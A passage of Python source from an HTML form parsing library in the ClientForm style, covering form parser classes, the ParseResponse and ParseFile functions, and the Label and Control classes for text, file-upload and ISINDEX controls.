SELECT\")\n        if self._option is not None:\n            self._end_option()\n\n        d = {}\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n\n        self._option = {}\n        self._option.update(d)\n        if (self._optgroup and \"disabled\" in self._optgroup and\n            \"disabled\" not in self._option):\n            self._option[\"disabled\"] = None\n\n    def _end_option(self):\n        debug(\"\")\n        if self._option is None:\n            raise ParseError(\"end of OPTION before start\")\n\n        contents = self._option.get(\"contents\", \"\").strip()\n        self._option[\"contents\"] = contents\n        if \"value\" not in self._option:\n            self._option[\"value\"] = contents\n        if \"label\" not in self._option:\n            self._option[\"label\"] = contents\n        # stuff dict of SELECT HTML attrs into a special private key\n        #  (gets deleted again later)\n        self._option[\"__select\"] = self._select\n        self._append_select_control(self._option)\n        self._option = None\n\n    def _append_select_control(self, attrs):\n        debug(\"%s\", attrs)\n        controls = self._current_form[2]\n        name = self._select.get(\"name\")\n        controls.append((\"select\", name, attrs))\n\n    def start_textarea(self, attrs):\n        debug(\"%s\", attrs)\n        if self._textarea is not None:\n            raise ParseError(\"nested TEXTAREAs\")\n        if self._select is not None:\n            raise ParseError(\"TEXTAREA inside SELECT\")\n        d = {}\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n        self._add_label(d)\n\n        self._textarea = d\n\n    def end_textarea(self):\n        debug(\"\")\n        if self._textarea is None:\n            raise ParseError(\"end of TEXTAREA before start\")\n        controls = self._current_form[2]\n        name = self._textarea.get(\"name\")\n        controls.append((\"textarea\", name, self._textarea))\n        self._textarea = None\n\n    def start_label(self, attrs):\n        debug(\"%s\", attrs)\n        if self._current_label:\n            self.end_label()\n        d = {}\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n        taken = bool(d.get(\"for\"))  # empty id is invalid\n        d[\"__text\"] = \"\"\n        d[\"__taken\"] = taken\n        if taken:\n            self.labels.append(d)\n        self._current_label = d\n\n    def end_label(self):\n        debug(\"\")\n        label = self._current_label\n        if label is None:\n            # something is ugly in the HTML, but we're ignoring it\n            return\n        self._current_label = None\n        # if it is staying around, it is True in all cases\n        del label[\"__taken\"]\n\n    def _add_label(self, d):\n        #debug(\"%s\", d)\n        if self._current_label is not None:\n            if not self._current_label[\"__taken\"]:\n                self._current_label[\"__taken\"] = True\n                d[\"__label\"] = self._current_label\n\n    def handle_data(self, data):\n        debug(\"%s\", data)\n\n        if self._option is not None:\n            # self._option is a dictionary of the OPTION element's HTML\n            # attributes, but it has two special keys, one of which is the\n            # special \"contents\" key contains text between OPTION tags (the\n            # other is the \"__select\" key: see the end_option method)\n            map = self._option\n            key = \"contents\"\n        elif self._textarea is not None:\n            map = self._textarea\n            key = \"value\"\n            data = normalize_line_endings(data)\n        # not if within option or textarea\n        elif self._current_label is not None:\n            map = self._current_label\n            key = \"__text\"\n        else:\n            return\n\n        if data and key not in map:\n            # according to\n            # http://www.w3.org/TR/html4/appendix/notes.html#h-B.3.1 line break\n            # immediately after start tags or immediately before end tags must\n            # be ignored, but real browsers only ignore a line break after a\n            # start tag, so we'll do that.\n            if data[0:2] == \"\\r\\n\":\n                data = data[2:]\n            elif data[0:1] in [\"\\n\", \"\\r\"]:\n                data = data[1:]\n            map[key] = data\n        else:\n            map[key] = (map[key].decode(\"utf8\", \"replace\") if isinstance(map[key], six.binary_type) else map[key]) + data\n\n    def do_button(self, attrs):\n        debug(\"%s\", attrs)\n        d = {}\n        d[\"type\"] = \"submit\"  # default\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n        controls = self._current_form[2]\n\n        type = d[\"type\"]\n        name = d.get(\"name\")\n        # we don't want to lose information, so use a type string that\n        # doesn't clash with INPUT TYPE={SUBMIT,RESET,BUTTON}\n        # e.g. type for BUTTON/RESET is \"resetbutton\"\n        #     (type for INPUT/RESET is \"reset\")\n        type = type+\"button\"\n        self._add_label(d)\n        controls.append((type, name, d))\n\n    def do_input(self, attrs):\n        debug(\"%s\", attrs)\n        d = {}\n        d[\"type\"] = \"text\"  # default\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n        controls = self._current_form[2]\n\n        type = d[\"type\"]\n        name = d.get(\"name\")\n        self._add_label(d)\n        controls.append((type, name, d))\n\n    def do_isindex(self, attrs):\n        debug(\"%s\", attrs)\n        d = {}\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n        controls = self._current_form[2]\n\n        self._add_label(d)\n        # isindex doesn't have type or name HTML attributes\n        controls.append((\"isindex\", None, d))\n\n    def handle_entityref(self, name):\n        #debug(\"%s\", name)\n        self.handle_data(unescape(\n            '&%s;' % name, self._entitydefs, self._encoding))\n\n    def handle_charref(self, name):\n        #debug(\"%s\", name)\n        self.handle_data(unescape_charref(name, self._encoding))\n\n    def unescape_attr(self, name):\n        #debug(\"%s\", name)\n        return unescape(name, self._entitydefs, self._encoding)\n\n    def unescape_attrs(self, attrs):\n        #debug(\"%s\", attrs)\n        escaped_attrs = {}\n        for key, val in attrs.items():\n            try:\n                val.items\n            except AttributeError:\n                escaped_attrs[key] = self.unescape_attr(val)\n            else:\n                # e.g. \"__select\" -- yuck!\n                escaped_attrs[key] = self.unescape_attrs(val)\n        return escaped_attrs\n\n    def unknown_entityref(self, ref): self.handle_data(\"&%s;\" % ref)\n    def unknown_charref(self, ref): self.handle_data(\"&#%s;\" % ref)\n\n\nif not HAVE_MODULE_HTMLPARSER:\n    class XHTMLCompatibleFormParser:\n        def __init__(self, entitydefs=None, encoding=DEFAULT_ENCODING):\n            raise ValueError(\"HTMLParser could not be imported\")\nelse:\n    class XHTMLCompatibleFormParser(_AbstractFormParser, HTMLParser.HTMLParser):\n        \"\"\"Good for XHTML, bad for tolerance of incorrect HTML.\"\"\"\n        # thanks to Michael Howitz for this!\n        def __init__(self, entitydefs=None, encoding=DEFAULT_ENCODING):\n            HTMLParser.HTMLParser.__init__(self)\n            _AbstractFormParser.__init__(self, entitydefs, encoding)\n\n        def feed(self, data):\n            try:\n                HTMLParser.HTMLParser.feed(self, data)\n            except HTMLParser.HTMLParseError as exc:\n                raise ParseError(exc)\n\n        def start_option(self, attrs):\n            _AbstractFormParser._start_option(self, attrs)\n\n        def end_option(self):\n            _AbstractFormParser._end_option(self)\n\n        def handle_starttag(self, tag, attrs):\n            try:\n                method = getattr(self, \"start_\" + tag)\n            except AttributeError:\n                try:\n                    method = getattr(self, \"do_\" + tag)\n                except AttributeError:\n                    pass  # unknown tag\n                else:\n                    method(attrs)\n            else:\n                method(attrs)\n\n        def handle_endtag(self, tag):\n            try:\n                method = getattr(self, \"end_\" + tag)\n            except AttributeError:\n                pass  # unknown tag\n            else:\n                method()\n\n        def unescape(self, name):\n            # Use the entitydefs passed into constructor, not\n            # HTMLParser.HTMLParser's entitydefs.\n            return self.unescape_attr(name)\n\n        def unescape_attr_if_required(self, name):\n            return name  # HTMLParser.HTMLParser already did it\n        def unescape_attrs_if_required(self, attrs):\n            return attrs  # ditto\n\n        def close(self):\n            HTMLParser.HTMLParser.close(self)\n            self.end_body()\n\n\nclass _AbstractSgmllibParser(_AbstractFormParser):\n\n    def do_option(self, attrs):\n        _AbstractFormParser._start_option(self, attrs)\n\n    if sys.version_info[:2] >= (2,5):\n        # we override this attr to decode hex charrefs\n        entity_or_charref = re.compile(\n            '&(?:([a-zA-Z][-.a-zA-Z0-9]*)|#(x?[0-9a-fA-F]+))(;?)')\n        def convert_entityref(self, name):\n            return unescape(\"&%s;\" % name, self._entitydefs, self._encoding)\n        def convert_charref(self, name):\n            return unescape_charref(\"%s\" % name, self._encoding)\n        def unescape_attr_if_required(self, name):\n            return name  # sgmllib already did it\n        def unescape_attrs_if_required(self, attrs):\n            return attrs  # ditto\n    else:\n        def unescape_attr_if_required(self, name):\n            return self.unescape_attr(name)\n        def unescape_attrs_if_required(self, attrs):\n            return self.unescape_attrs(attrs)\n\n\nclass FormParser(_AbstractSgmllibParser, sgmllib.SGMLParser):\n    \"\"\"Good for tolerance of incorrect HTML, bad for XHTML.\"\"\"\n    def __init__(self, entitydefs=None, encoding=DEFAULT_ENCODING):\n        sgmllib.SGMLParser.__init__(self)\n        _AbstractFormParser.__init__(self, entitydefs, encoding)\n\n    def feed(self, data):\n        try:\n            sgmllib.SGMLParser.feed(self, data)\n        except SGMLLIB_PARSEERROR as exc:\n            raise ParseError(exc)\n\n    def close(self):\n        sgmllib.SGMLParser.close(self)\n        self.end_body()\n\n\n# sigh, must support mechanize by allowing dynamic creation of classes based on\n# its bundled copy of BeautifulSoup (which was necessary because of dependency\n# problems)\n\ndef _create_bs_classes(bs,\n                       icbinbs,\n                       ):\n    class _AbstractBSFormParser(_AbstractSgmllibParser):\n        bs_base_class = None\n        def __init__(self, entitydefs=None, encoding=DEFAULT_ENCODING):\n            _AbstractFormParser.__init__(self, entitydefs, encoding)\n            self.bs_base_class.__init__(self)\n        def handle_data(self, data):\n            _AbstractFormParser.handle_data(self, data)\n            self.bs_base_class.handle_data(self, data)\n        def feed(self, data):\n            try:\n                self.bs_base_class.feed(self, data)\n            except SGMLLIB_PARSEERROR as exc:\n                raise ParseError(exc)\n        def close(self):\n            self.bs_base_class.close(self)\n            self.end_body()\n\n    class RobustFormParser(_AbstractBSFormParser, bs):\n        \"\"\"Tries to be highly tolerant of incorrect HTML.\"\"\"\n        pass\n    RobustFormParser.bs_base_class = bs\n    class NestingRobustFormParser(_AbstractBSFormParser, icbinbs):\n        \"\"\"Tries to be highly tolerant of incorrect HTML.\n\n        Different from RobustFormParser in that it more often guesses nesting\n        above missing end tags (see BeautifulSoup docs).\n\n        \"\"\"\n        pass\n    NestingRobustFormParser.bs_base_class = icbinbs\n\n    return RobustFormParser, NestingRobustFormParser\n\ntry:\n    if sys.version_info[:2] < (2, 2):\n        raise ImportError  # BeautifulSoup uses generators\n    import BeautifulSoup\nexcept ImportError:\n    pass\nelse:\n    RobustFormParser, NestingRobustFormParser = _create_bs_classes(\n        BeautifulSoup.BeautifulSoup, BeautifulSoup.ICantBelieveItsBeautifulSoup\n        )\n    __all__ += ['RobustFormParser', 'NestingRobustFormParser']\n\n\n#FormParser = XHTMLCompatibleFormParser  # testing hack\n#FormParser = RobustFormParser  # testing hack\n\n\ndef ParseResponseEx(response,\n                    select_default=False,\n                    form_parser_class=FormParser,\n                    request_class=_urllib.request.Request,\n                    entitydefs=None,\n                    encoding=DEFAULT_ENCODING,\n\n                    # private\n                    _urljoin=_urllib.parse.urljoin,\n                    _urlparse=_urllib.parse.urlparse,\n                    _urlunparse=_urllib.parse.urlunparse,\n                    ):\n    \"\"\"Identical to ParseResponse, except that:\n\n    1. The returned list contains an extra item.  The first form in the list\n    contains all controls not contained in any FORM element.\n\n    2. The arguments ignore_errors and backwards_compat have been removed.\n\n    3. Backwards-compatibility mode (backwards_compat=True) is not available.\n    \"\"\"\n    return _ParseFileEx(response, response.geturl(),\n                        select_default,\n                        False,\n                        form_parser_class,\n                        request_class,\n                        entitydefs,\n                        False,\n                        encoding,\n                        _urljoin=_urljoin,\n                        _urlparse=_urlparse,\n                        _urlunparse=_urlunparse,\n                        )\n\ndef ParseFileEx(file, base_uri,\n                select_default=False,\n                form_parser_class=FormParser,\n                request_class=_urllib.request.Request,\n                entitydefs=None,\n                encoding=DEFAULT_ENCODING,\n\n                # private\n                _urljoin=_urllib.parse.urljoin,\n                _urlparse=_urllib.parse.urlparse,\n                _urlunparse=_urllib.parse.urlunparse,\n                ):\n    \"\"\"Identical to ParseFile, except that:\n\n    1. The returned list contains an extra item.  The first form in the list\n    contains all controls not contained in any FORM element.\n\n    2. The arguments ignore_errors and backwards_compat have been removed.\n\n    3. Backwards-compatibility mode (backwards_compat=True) is not available.\n    \"\"\"\n    return _ParseFileEx(file, base_uri,\n                        select_default,\n                        False,\n                        form_parser_class,\n                        request_class,\n                        entitydefs,\n                        False,\n                        encoding,\n                        _urljoin=_urljoin,\n                        _urlparse=_urlparse,\n                        _urlunparse=_urlunparse,\n                        )\n\ndef ParseResponse(response, *args, **kwds):\n    \"\"\"Parse HTTP response and return a list of HTMLForm instances.\n\n    The return value of urllib2.urlopen can be conveniently passed to this\n    function as the response parameter.\n\n    ClientForm.ParseError is raised on parse errors.\n\n    response: file-like object (supporting read() method) with a method\n     geturl(), returning the URI of the HTTP response\n    select_default: for multiple-selection SELECT controls and RADIO controls,\n     pick the first item as the default if none are selected in the HTML\n    form_parser_class: class to instantiate and use to pass\n    request_class: class to return from .click() method (default is\n     _urllib.request.Request)\n    entitydefs: mapping like {\"&amp;\": \"&\", ...} containing HTML entity\n     definitions (a sensible default is used)\n    encoding: character encoding used for encoding numeric character references\n     when matching link text.  ClientForm does not attempt to find the encoding\n     in a META HTTP-EQUIV attribute in the document itself (mechanize, for\n     example, does do that and will pass the correct value to ClientForm using\n     this parameter).\n\n    backwards_compat: boolean that determines whether the returned HTMLForm\n     objects are backwards-compatible with old code.  If backwards_compat is\n     true:\n\n     - ClientForm 0.1 code will continue to work as before.\n\n     - Label searches that do not specify a nr (number or count) will always\n       get the first match, even if other controls match.  If\n       backwards_compat is False, label searches that have ambiguous results\n       will raise an AmbiguityError.\n\n     - Item label matching is done by strict string comparison rather than\n       substring matching.\n\n     - De-selecting individual list items is allowed even if the Item is\n       disabled.\n\n    The backwards_compat argument will be deprecated in a future release.\n\n    Pass a true value for select_default if you want the behaviour specified by\n    RFC 1866 (the HTML 2.0 standard), which is to select the first item in a\n    RADIO or multiple-selection SELECT control if none were selected in the\n    HTML.  Most browsers (including Microsoft Internet Explorer (IE) and\n    Netscape Navigator) instead leave all items unselected in these cases.  The\n    W3C HTML 4.0 standard leaves this behaviour undefined in the case of\n    multiple-selection SELECT controls, but insists that at least one RADIO\n    button should be checked at all times, in contradiction to browser\n    behaviour.\n\n    There is a choice of parsers.  ClientForm.XHTMLCompatibleFormParser (uses\n    HTMLParser.HTMLParser) works best for XHTML, ClientForm.FormParser (uses\n    sgmllib.SGMLParser) (the default) works better for ordinary grubby HTML.\n    Note that HTMLParser is only available in Python 2.2 and later.  You can\n    pass your own class in here as a hack to work around bad HTML, but at your\n    own risk: there is no well-defined interface.\n\n    \"\"\"\n    return _ParseFileEx(response, response.geturl(), *args, **kwds)[1:]\n\ndef ParseFile(file, base_uri, *args, **kwds):\n    \"\"\"Parse HTML and return a list of HTMLForm instances.\n\n    ClientForm.ParseError is raised on parse errors.\n\n    file: file-like object (supporting read() method) containing HTML with zero\n     or more forms to be parsed\n    base_uri: the URI of the document (note that the base URI used to submit\n     the form will be that given in the BASE element if present, not that of\n     the document)\n\n    For the other arguments and further details, see ParseResponse.__doc__.\n\n    \"\"\"\n    return _ParseFileEx(file, base_uri, *args, **kwds)[1:]\n\ndef _ParseFileEx(file, base_uri,\n                 select_default=False,\n                 ignore_errors=False,\n                 form_parser_class=FormParser,\n                 request_class=_urllib.request.Request,\n                 entitydefs=None,\n                 backwards_compat=True,\n                 encoding=DEFAULT_ENCODING,\n                 _urljoin=_urllib.parse.urljoin,\n                 _urlparse=_urllib.parse.urlparse,\n                 _urlunparse=_urllib.parse.urlunparse,\n                 ):\n    if backwards_compat:\n        deprecation(\"operating in backwards-compatibility mode\", 1)\n    fp = form_parser_class(entitydefs, encoding)\n    while 1:\n        data = file.read(CHUNK)\n        try:\n            fp.feed(data)\n        except ParseError as e:\n            e.base_uri = base_uri\n            raise\n        if len(data) != CHUNK: break\n    fp.close()\n    if fp.base is not None:\n        # HTML BASE element takes precedence over document URI\n        base_uri = fp.base\n    labels = []  # Label(label) for label in fp.labels]\n    id_to_labels = {}\n    for l in fp.labels:\n        label = Label(l)\n        labels.append(label)\n        for_id = l[\"for\"]\n        coll = id_to_labels.get(for_id)\n        if coll is None:\n            id_to_labels[for_id] = [label]\n        else:\n            coll.append(label)\n    forms = []\n    for (name, action, method, enctype), attrs, controls in fp.forms:\n        if action is None:\n            action = base_uri\n        else:\n            action = six.text_type(action, \"utf8\") if action and isinstance(action, six.binary_type) else action\n            action = _urljoin(base_uri, action)\n        # would be nice to make HTMLForm class (form builder) pluggable\n        form = HTMLForm(\n            action, method, enctype, name, attrs, request_class,\n            forms, labels, id_to_labels, backwards_compat)\n        form._urlparse = _urlparse\n        form._urlunparse = _urlunparse\n        for ii in xrange(len(controls)):\n            type, name, attrs = controls[ii]\n            # index=ii*10 allows ImageControl to return multiple ordered pairs\n            form.new_control(\n                type, name, attrs, select_default=select_default, index=ii*10)\n        forms.append(form)\n    for form in forms:\n        try:\n            form.fixup()\n        except AttributeError as ex:\n            if not any(_ in str(ex) for _ in (\"is disabled\", \"is readonly\")):\n                raise\n    return forms\n\n\nclass Label:\n    def __init__(self, attrs):\n        self.id = attrs.get(\"for\")\n        self._text = attrs.get(\"__text\").strip()\n        self._ctext = compress_text(self._text)\n        self.attrs = attrs\n        self._backwards_compat = False  # maintained by HTMLForm\n\n    def __getattr__(self, name):\n        if name == \"text\":\n            if self._backwards_compat:\n                return self._text\n            else:\n                return self._ctext\n        return getattr(Label, name)\n\n    def __setattr__(self, name, value):\n        if name == \"text\":\n            # don't see any need for this, so make it read-only\n            raise AttributeError(\"text attribute is read-only\")\n        self.__dict__[name] = value\n\n    def __str__(self):\n        return \"<Label(id=%r, text=%r)>\" % (self.id, self.text)\n\n\ndef _get_label(attrs):\n    text = attrs.get(\"__label\")\n    if text is not None:\n        return Label(text)\n    else:\n        return None\n\nclass Control:\n    \"\"\"An HTML form control.\n\n    An HTMLForm contains a sequence of Controls.  The Controls in an HTMLForm\n    are accessed using the HTMLForm.find_control method or the\n    HTMLForm.controls attribute.\n\n    Control instances are usually constructed using the ParseFile /\n    ParseResponse functions.  If you use those functions, you can ignore the\n    rest of this paragraph.  A Control is only properly initialised after the\n    fixup method has been called.  In fact, this is only strictly necessary for\n    ListControl instances.  This is necessary because ListControls are built up\n    from ListControls each containing only a single item, and their initial\n    value(s) can only be known after the sequence is complete.\n\n    The types and values that are acceptable for assignment to the value\n    attribute are defined by subclasses.\n\n    If the disabled attribute is true, this represents the state typically\n    represented by browsers by 'greying out' a control.  If the disabled\n    attribute is true, the Control will raise AttributeError if an attempt is\n    made to change its value.  In addition, the control will not be considered\n    'successful' as defined by the W3C HTML 4 standard -- ie. it will\n    contribute no data to the return value of the HTMLForm.click* methods.  To\n    enable a control, set the disabled attribute to a false value.\n\n    If the readonly attribute is true, the Control will raise AttributeError if\n    an attempt is made to change its value.  To make a control writable, set\n    the readonly attribute to a false value.\n\n    All controls have the disabled and readonly attributes, not only those that\n    may have the HTML attributes of the same names.\n\n    On assignment to the value attribute, the following exceptions are raised:\n    TypeError, AttributeError (if the value attribute should not be assigned\n    to, because the control is disabled, for example) and ValueError.\n\n    If the name or value attributes are None, or the value is an empty list, or\n    if the control is disabled, the control is not successful.\n\n    Public attributes:\n\n    type: string describing type of control (see the keys of the\n     HTMLForm.type2class dictionary for the allowable values) (readonly)\n    name: name of control (readonly)\n    value: current value of control (subclasses may allow a single value, a\n     sequence of values, or either)\n    disabled: disabled state\n    readonly: readonly state\n    id: value of id HTML attribute\n\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        \"\"\"\n        type: string describing type of control (see the keys of the\n         HTMLForm.type2class dictionary for the allowable values)\n        name: control name\n        attrs: HTML attributes of control's HTML element\n\n        \"\"\"\n        raise NotImplementedError()\n\n    def add_to_form(self, form):\n        self._form = form\n        form.controls.append(self)\n\n    def fixup(self):\n        pass\n\n    def is_of_kind(self, kind):\n        raise NotImplementedError()\n\n    def clear(self):\n        raise NotImplementedError()\n\n    def __getattr__(self, name): raise NotImplementedError()\n    def __setattr__(self, name, value): raise NotImplementedError()\n\n    def pairs(self):\n        \"\"\"Return list of (key, value) pairs suitable for passing to urlencode.\n        \"\"\"\n        return [(k, v) for (i, k, v) in self._totally_ordered_pairs()]\n\n    def _totally_ordered_pairs(self):\n        \"\"\"Return list of (key, value, index) tuples.\n\n        Like pairs, but allows preserving correct ordering even where several\n        controls are involved.\n\n        \"\"\"\n        raise NotImplementedError()\n\n    def _write_mime_data(self, mw, name, value):\n        \"\"\"Write data for a subitem of this control to a MimeWriter.\"\"\"\n        # called by HTMLForm\n        mw2 = mw.nextpart()\n        mw2.addheader(\"Content-Disposition\",\n                      'form-data; name=\"%s\"' % name, 1)\n        f = mw2.startbody(prefix=0)\n        f.write(value)\n\n    def __str__(self):\n        raise NotImplementedError()\n\n    def get_labels(self):\n        \"\"\"Return all labels (Label instances) for this control.\n\n        If the control was surrounded by a <label> tag, that will be the first\n        label; all other labels, connected by 'for' and 'id', are in the order\n        that appear in the HTML.\n\n        \"\"\"\n        res = []\n        if self._label:\n            res.append(self._label)\n        if self.id:\n            res.extend(self._form._id_to_labels.get(self.id, ()))\n        return res\n\n\n#---------------------------------------------------\nclass ScalarControl(Control):\n    \"\"\"Control whose value is not restricted to one of a prescribed set.\n\n    Some ScalarControls don't accept any value attribute.  Otherwise, takes a\n    single value, which must be string-like.\n\n    Additional read-only public attribute:\n\n    attrs: dictionary mapping the names of original HTML attributes of the\n     control to their values\n\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        self._index = index\n        self._label = _get_label(attrs)\n        self.__dict__[\"type\"] = type.lower()\n        self.__dict__[\"name\"] = name\n        self._value = attrs.get(\"value\")\n        self.disabled = \"disabled\" in attrs\n        self.readonly = \"readonly\" in attrs\n        self.id = attrs.get(\"id\")\n\n        self.attrs = attrs.copy()\n\n        self._clicked = False\n\n        self._urlparse = _urllib.parse.urlparse\n        self._urlunparse = _urllib.parse.urlunparse\n\n    def __getattr__(self, name):\n        if name == \"value\":\n            return self.__dict__[\"_value\"]\n        else:\n            raise AttributeError(\"%s instance has no attribute '%s'\" %\n                                 (self.__class__.__name__, name))\n\n    def __setattr__(self, name, value):\n        if name == \"value\":\n            if not isstringlike(value):\n                raise TypeError(\"must assign a string\")\n            elif self.readonly:\n                raise AttributeError(\"control '%s' is readonly\" % self.name)\n            elif self.disabled:\n                raise AttributeError(\"control '%s' is disabled\" % self.name)\n            self.__dict__[\"_value\"] = value\n        elif name in (\"name\", \"type\"):\n            raise AttributeError(\"%s attribute is readonly\" % name)\n        else:\n            self.__dict__[name] = value\n\n    def _totally_ordered_pairs(self):\n        name = self.name\n        value = self.value\n        if name is None or value is None or self.disabled:\n            return []\n        return [(self._index, name, value)]\n\n    def clear(self):\n        if self.readonly:\n            raise AttributeError(\"control '%s' is readonly\" % self.name)\n        self.__dict__[\"_value\"] = None\n\n    def __str__(self):\n        name = self.name\n        value = self.value\n        if name is None: name = \"<None>\"\n        if value is None: value = \"<None>\"\n\n        infos = []\n        if self.disabled: infos.append(\"disabled\")\n        if self.readonly: infos.append(\"readonly\")\n        info = \", \".join(infos)\n        if info: info = \" (%s)\" % info\n\n        return \"<%s(%s=%s)%s>\" % (self.__class__.__name__, name, value, info)\n\n\n#---------------------------------------------------\nclass TextControl(ScalarControl):\n    \"\"\"Textual input control.\n\n    Covers:\n\n    INPUT/TEXT\n    INPUT/PASSWORD\n    INPUT/HIDDEN\n    TEXTAREA\n\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)\n        if self.type == \"hidden\": self.readonly = True\n        if self._value is None:\n            self._value = \"\"\n\n    def is_of_kind(self, kind): return kind == \"text\"\n\n#---------------------------------------------------\nclass FileControl(ScalarControl):\n    \"\"\"File upload with INPUT TYPE=FILE.\n\n    The value attribute of a FileControl is always None.  Use add_file instead.\n\n    Additional public method: add_file\n\n    \"\"\"\n\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)\n        self._value = None\n        self._upload_data = []\n\n    def is_of_kind(self, kind): return kind == \"file\"\n\n    def clear(self):\n        if self.readonly:\n            raise AttributeError(\"control '%s' is readonly\" % self.name)\n        self._upload_data = []\n\n    def __setattr__(self, name, value):\n        if name in (\"value\", \"name\", \"type\"):\n            raise AttributeError(\"%s attribute is readonly\" % name)\n        else:\n            self.__dict__[name] = value\n\n    def add_file(self, file_object, content_type=None, filename=None):\n        if not hasattr(file_object, \"read\"):\n            raise TypeError(\"file-like object must have read method\")\n        if content_type is not None and not isstringlike(content_type):\n            raise TypeError(\"content type must be None or string-like\")\n        if filename is not None and not isstringlike(filename):\n            raise TypeError(\"filename must be None or string-like\")\n        if content_type is None:\n            content_type = \"application/octet-stream\"\n        self._upload_data.append((file_object, content_type, filename))\n\n    def _totally_ordered_pairs(self):\n        # XXX should it be successful even if unnamed?\n        if self.name is None or self.disabled:\n            return []\n        return [(self._index, self.name, \"\")]\n\n    def _write_mime_data(self, mw, _name, _value):\n        # called by HTMLForm\n        # assert _name == self.name and _value == ''\n        if len(self._upload_data) < 2:\n            if len(self._upload_data) == 0:\n                file_object = _cStringIO()\n                content_type = \"application/octet-stream\"\n                filename = \"\"\n            else:\n                file_object, content_type, filename = self._upload_data[0]\n                if filename is None:\n                    filename = \"\"\n            mw2 = mw.nextpart()\n            fn_part = '; filename=\"%s\"' % filename\n            disp = 'form-data; name=\"%s\"%s' % (self.name, fn_part)\n            mw2.addheader(\"Content-Disposition\", disp, prefix=1)\n            fh = mw2.startbody(content_type, prefix=0)\n            fh.write(file_object.read())\n        else:\n            # multiple files\n            mw2 = mw.nextpart()\n            disp = 'form-data; name=\"%s\"' % self.name\n            mw2.addheader(\"Content-Disposition\", disp, prefix=1)\n            fh = mw2.startmultipartbody(\"mixed\", prefix=0)\n            for file_object, content_type, filename in self._upload_data:\n                mw3 = mw2.nextpart()\n                if filename is None:\n                    filename = \"\"\n                fn_part = '; filename=\"%s\"' % filename\n                disp = \"file%s\" % fn_part\n                mw3.addheader(\"Content-Disposition\", disp, prefix=1)\n                fh2 = mw3.startbody(content_type, prefix=0)\n                fh2.write(file_object.read())\n            mw2.lastpart()\n\n    def __str__(self):\n        name = self.name\n        if name is None: name = \"<None>\"\n\n        if not self._upload_data:\n            value = \"<No files added>\"\n        else:\n            value = []\n            for file, ctype, filename in self._upload_data:\n                if filename is None:\n                    value.append(\"<Unnamed file>\")\n                else:\n                    value.append(filename)\n            value = \", \".join(value)\n\n        info = []\n        if self.disabled: info.append(\"disabled\")\n        if self.readonly: info.append(\"readonly\")\n        info = \", \".join(info)\n        if info: info = \" (%s)\" % info\n\n        return \"<%s(%s=%s)%s>\" % (self.__class__.__name__, name, value, info)\n\n\n#---------------------------------------------------\nclass IsindexControl(ScalarControl):\n    \"\"\"ISINDEX control.\n\n    ISINDEX is the odd-one-out of HTML form controls.  In fact, it isn't really\n    part of regular HTML forms at all, and predates it.  You're only allowed\n    one ISINDEX per HTML document.  ISINDEX and regular form submission are\n    mutually exclusive -- either submit a form, or the ISINDEX.\n\n    Having said this, since ISINDEX controls may appear in forms (which is\n    probably bad HTML), ParseFile / ParseResponse will include them in the\n    HTMLForm instances it returns.  You can set the ISINDEX's value, as with\n    any other control (but note that ISINDEX controls have no name, so you'll\n    need to use the type argument of set_value!).  When you submit the form,\n    the ISINDEX will not be successful (ie., no data will get returned to the\n    server as a result of its presence), unless you click on the ISINDEX\n    control, in which case the ISINDEX gets submitted instead of the form:\n\n    form.set_value(\"my isindex value\", type=\"isindex\")\n    urllib2.urlopen(form.click(type=\"isindex\"))\n\n    ISINDEX elements outside of FORMs are ignored.  If you want to submit one\n    by hand, do it like so:\n\n    url = _urllib.parse.urljoin(page_uri, \"?\"+_urllib.parse.quote_plus(\"my isindex value\"))\n    result = urllib2.urlopen(url)\n\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)\n        if self._value is None:\n            self._value = \"\"\n\n    def is_of_kind(self, kind): return kind in [\"text\", \"clickable\"]\n\n    def _totally_ordered_pairs(self):\n        return []\n\n    def _click(self, form, coord, return_type, request_class=_urllib.request.Request):\n        # Relative URL for ISINDEX submission: instead of \"foo=bar+baz\",\n        # want \"bar+baz\".\n        # This doesn't seem to be specified in HTML 4.01 spec. (ISINDEX is\n        # deprecated in 4.01, but it should still say how to submit it).\n        # Submission of ISINDEX is explained in the HTML 3.2 spec, though.\n        parts = self._urlparse(form.action)\n        rest, (query, frag) = parts[:-2], parts[-2:]\n        parts = rest + (_urllib.parse.quote_plus(self.value), None)\n        url = self._urlunparse(parts)\n        req_data = url, None, []\n\n        if return_type == \"pairs\":\n            return []\n        elif return_type == \"request_data\":\n            return req_data\n        else:\n            return request_class(url)\n\n    def __str__(self):\n        value = self.value\n        if value is None: value = \"<None>\"\n\n        infos = []\n        if self.disabled: infos.append(\"disabled\")\n        if self.readonly: infos.append(\"readonly\")\n        info = \", \".join(infos)\n        if info: info = \" (%s)\" % info\n\n        return \"<%s(%s)%s>\" % (self.__class__.__name__, value, info)\n\n\n#---------------------------------------------------\nclass IgnoreControl(ScalarControl):\n    \"\"\"Control that we're not interested in.\n\n    Covers:\n\n    INPUT/RESET\n    BUTTON/RESET\n    INPUT/BUTTON\n    BUTTON/BUTTON\n\n    These controls are always unsuccessful, in the terminology of HTML 4 (ie.\n    they never require any information to be returned to the server).\n\n    BUTTON/BUTTON is used to generate events for script embedded in HTML.\n\n    The value attribute of IgnoreControl is always None.\n\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)\n        self._value = None\n\n    def is_of_kind(self, kind): return False\n\n    def __setattr__(self, name, value):\n        if name == \"value\":\n            raise AttributeError(\n                \"control '%s' is ignored, hence read-only\" % self.name)\n        elif name in (\"name\", \"type\"):\n            raise AttributeError(\"%s attribute is readonly\" % name)\n        else:\n            self.__dict__[name] = value\n\n\n#---------------------------------------------------\n# ListControls\n\n# helpers and subsidiary classes\n\nclass Item:\n    def __init__(self, control, attrs, index=None):\n        label = _get_label(attrs)\n        